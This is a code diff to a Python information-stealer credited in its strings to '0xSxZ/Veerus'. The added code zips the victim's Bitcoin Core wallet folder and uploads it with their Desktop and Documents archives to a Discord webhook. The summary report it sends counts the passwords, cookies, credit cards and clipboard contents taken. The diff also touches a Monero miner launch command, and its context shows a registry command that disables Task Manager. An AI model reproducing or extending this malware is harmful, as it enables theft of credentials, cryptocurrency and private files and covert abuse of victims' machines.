@@ -74,6 +74,8 @@ STATSAPI = [
 
 
 os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
+
+WALLETCOUNT = 0
 CURRENCYPWNUM = 0
 CREDITCARDSNUM = 0
 CURRENCYCOOKIESNUM = 0
@@ -113,6 +115,12 @@ currency = "=========Stealed by 0xSxZ =============\n\n"
 currencyCookies = "=========Stealed by 0xSxZ =============\n\n"
 local_appdata = os.environ['LOCALAPPDATA'] + "\\"
 default_appdata = os.getenv('APPDATA')
+
+walletspath = [
+	default_appdata + "\\Bitcoin"
+]
+
+
 chromiumpaths = [
 	default_appdata + "\\Opera Software\\Opera Stable",
 	default_appdata + "\\Opera Software\\Opera GX Stable",
@@ -145,6 +153,16 @@ chromiumpaths = [
 yes = "yes"
 
 if yes == "yes":
+
+	def stealBitcoinCore():
+		global WALLETCOUNT
+		try:
+			btcUuid = str(uuid.uuid4())
+			shutil.make_archive(btcUuid, 'zip', walletspath[0] + "\\wallets")
+			WALLETCOUNT = WALLETCOUNT + 1
+			return btcUuid + ".zip"
+		except:
+			return "No wallets"
 
 	def GetClipboardData():
 		win32clipboard.OpenClipboard()
@@ -677,7 +695,7 @@ if yes == "yes":
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --threads=4 --background')
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --threads=4')
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
 		try:
@@ -814,17 +832,20 @@ if yes == "yes":
 		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="History.txt")
 		webhook.add_file(file=currency, filename="Currency Passwords.txt")
 		webhook.add_file(file=currencyCookies, filename="Currency Cookies.txt")
-		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_with_wings: Currency Password : {CURRENCYPWNUM}\n:clipboard: Clipboard : ```{GetClipboardData()}```**', color='03b2f8')
-		webhook.add_embed(embed2)
 		webhook.execute()
 		connectOption()
 		os.system("cd")
 		getfiles()
 		time.sleep(2)
 		print("[.] Sending Desktop")
+		btcCore = stealBitcoinCore()
 		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
+		if(btcCore != "No wallets"):
+			webhook.add_file(file=open(btcCore, "rb").read(), filename="BtcCoreWallet.zip")
 		webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
 		webhook.add_file(file=open("Documents.zip", "rb").read(), filename="Documents.zip")
+		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_mouth: Currency Password : {CURRENCYPWNUM}\n:pushpin: Wallet Count : {WALLETCOUNT}\n:clipboard: Clipboard : ```{GetClipboardData()}```**', color='03b2f8')
+		webhook.add_embed(embed2)
 		webhook.execute()
 	print("[.] Sending Stats")
 	threading.Thread(target=minerstats).start()
